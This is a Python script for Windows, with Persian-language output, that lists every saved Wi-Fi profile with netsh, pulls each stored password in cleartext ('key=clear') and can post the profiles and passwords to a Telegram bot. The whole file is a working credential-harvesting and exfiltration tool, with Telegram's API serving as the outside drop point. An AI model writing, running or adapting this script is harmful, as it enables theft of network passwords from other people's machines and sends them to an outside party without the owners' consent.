#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import re
import argparse
import json
from typing import List, Dict, Optional
import os
import requests

BOT_TOKEN = os.getenv("WIFI_BOT_TOKEN", "TOKEN")
CHAT_ID = os.getenv("WIFI_CHAT_ID", "CHAT_ID")

def run_command(cmd: List[str]) -> str:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, check=False)
        output = p.stdout or p.stderr or ""
        return output
    except Exception as e:
        return f"ERROR: {e}"

def extract_profiles(output: str) -> List[str]:
    return [m.strip() for m in re.findall(r"All User Profile\s*:\s*(.+)", output, flags=re.IGNORECASE)]

def parse_profile_details(output: str) -> Dict[str, Optional[str]]:
    def search(patterns):
        for pat in patterns:
            m = re.search(pat, output, flags=re.IGNORECASE | re.MULTILINE)
            if m:
                return m.group(1).strip()
        return None

    return {
        "ssid_name": search([r"SSID name\s*:\s*(.+)", r"SSID\s*:\s*(?:name\s*:\s*)?(.+)"]),
        "authentication": search([r"Authentication\s*:\s*(.+)"]),
        "cipher": search([r"Cipher\s*:\s*(.+)"]),
        "connection_mode": search([r"Connection mode\s*:\s*(.+)"]),
        "network_type": search([r"Network type\s*:\s*(.+)"]),
        "cost": search([r"Cost\s*:\s*(.+)"]),
    }

def extract_password(output: str) -> Optional[str]:
    m = re.search(r"Key Content\s*:\s*(.+)", output, flags=re.IGNORECASE)
    return m.group(1).strip() if m else None

def get_interface_info() -> Dict[str, Optional[str]]:
    out = run_command(["netsh", "wlan", "show", "interfaces"])
    def s(p):
        m = re.search(p, out, flags=re.IGNORECASE | re.MULTILINE)
        return m.group(1).strip() if m else None
    return {
        "name": s(r"Name\s*:\s*(.+)"),
        "ssid": s(r"^\s*SSID\s*:\s*(.+)$"),
        "bssid": s(r"BSSID\s*:\s*(.+)"),
        "signal": s(r"Signal\s*:\s*(.+)"),
        "radio_type": s(r"Radio type\s*:\s*(.+)"),
        "state": s(r"State\s*:\s*(.+)"),
    }

def gather_all_profiles(reveal_passwords: bool = False) -> List[Dict[str, Optional[str]]]:
    profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
    profiles = extract_profiles(profiles_output)
    result = []
    for p in profiles:
        profile_arg = f'name={p}'
        detail_out = run_command(["netsh", "wlan", "show", "profile", profile_arg, "key=clear"])
        details = parse_profile_details(detail_out)
        item = {"profile_name": p}
        item.update(details)
        item["password_raw"] = extract_password(detail_out) if reveal_passwords else None
        result.append(item)
    return result

def format_summary(profiles: List[Dict[str, Optional[str]]], iface: Dict[str, Optional[str]], include_passwords: bool = False) -> str:
    lines = []
    lines.append("📡 <b>Wi-Fi Profiles Summary</b>")
    lines.append("")
    lines.append("<b>Interface:</b>")
    for k in ("name", "ssid", "signal", "radio_type", "state"):
        v = iface.get(k)
        if v:
            lines.append(f"{k.title()}: {v}")
    lines.append("")
    for p in profiles:
        lines.append(f"• {p.get('profile_name')}")
        for field in ("ssid_name", "authentication", "cipher", "connection_mode", "network_type", "cost"):
            val = p.get(field)
            if val:
                lines.append(f"    {field.replace('_',' ').title()}: {val}")
        if include_passwords:
            if p.get("password_raw"):
                lines.append(f"    Password: {p.get('password_raw')}")
            else:
                lines.append(f"    Password: (none)")
        lines.append("")
    return "\n".join(lines)

def send_to_telegram(text: str) -> bool:
    if not BOT_TOKEN or not CHAT_ID:
        print("Telegram token or chat id is empty.")
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        resp = requests.post(url, json=payload, timeout=12)
        if resp.ok:
            return True
        else:
            print("Telegram API error:", resp.status_code, resp.text)
            return False
    except Exception as e:
        print("Error sending to Telegram:", e)
        return False

def pretty_print_local(profiles: List[Dict[str, Optional[str]]], iface: Dict[str, Optional[str]], reveal_passwords: bool):
    print("\n=== Current WLAN Interface ===")
    for k, v in iface.items():
        print(f"{k:12}: {v}")
    print("\n=== Saved Wi-Fi Profiles ===")
    for idx, p in enumerate(profiles, 1):
        print(f"\n[{idx}] Profile name : {p.get('profile_name')}")
        for field in ("ssid_name", "authentication", "cipher", "connection_mode", "network_type", "cost"):
            val = p.get(field)
            if val:
                print(f"    {field.replace('_',' ').title():18}: {val}")
        if reveal_passwords and p.get("password_raw"):
            print(f"    {'Password':18}: {p.get('password_raw')}")
        else:
            print(f"    {'Password':18}: (hidden)")
    print("\n-- پایان گزارش (محلی) --\n")

def parse_args():
    parser = argparse.ArgumentParser(description="گرفتن اطلاعات پروفایل‌های وای‌فای")
    parser.add_argument("--reveal", action="store_true")
    parser.add_argument("--send-telegram", action="store_true")
    return parser.parse_args()

def main():
    args = parse_args()
    iface = get_interface_info()
    profiles = gather_all_profiles(reveal_passwords=args.reveal)
    if not profiles:
        print("⚠️ هیچ پروفایل وای‌فای ذخیره‌شده‌ای پیدا نشد.")
        return
    pretty_print_local(profiles, iface, reveal_passwords=args.reveal)
    if args.send_telegram:
        summary = format_summary(profiles, iface, include_passwords=args.reveal)
        ok = send_to_telegram(summary)
        print("✅ گزارش به تلگرام ارسال شد." if ok else "❌ ارسال گزارش به تلگرام ناموفق بود.")

if __name__ == "__main__":
    main()
